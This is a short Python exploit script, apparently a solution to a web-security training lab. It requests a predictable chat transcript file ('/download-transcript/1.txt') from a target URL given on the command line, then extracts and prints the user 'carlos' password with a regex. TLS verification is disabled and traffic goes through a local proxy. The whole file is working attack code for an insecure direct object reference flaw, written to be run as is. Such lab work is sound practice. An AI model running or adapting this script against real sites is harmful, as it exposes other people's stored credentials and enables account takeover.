import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def broken_authentification_exploit(session, url) :
    # Displaying the file content carlos' password
    download_url = url + "/download-transcript/1.txt"
    r = session.get(download_url, verify=False, proxies=proxies)
    
    if r.status_code == 200 :
        matches = re.search(r"You: Ok so my password is (.*)\. Is that right\?", r.text)
        if matches :
            password = matches.group(1)
            print("(+) Here is carlos password : " + password)
        else :
            print("(-) Could not retrieve carlos password.")
            sys.exit(-1)
    else :
        print("Could not display as the chat content!")

if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    broken_authentification_exploit(session, url)